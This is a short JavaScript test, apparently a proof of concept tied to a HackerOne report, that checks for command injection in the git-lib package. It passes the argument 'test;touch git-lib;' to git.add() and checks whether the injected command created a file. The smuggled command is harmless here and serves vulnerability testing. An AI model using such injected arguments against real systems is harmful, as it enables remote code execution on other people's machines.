//https://hackerone.com/reports/718241
test("Remote code execution in git-lib", () => {
  expect.assertions(2);
  const git = require("git-lib");
  const fs = require("fs");
  const path = "./git-lib";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      // console.log('File removed:', path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    return git.add("test;touch git-lib;").finally(function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (error) {}
});
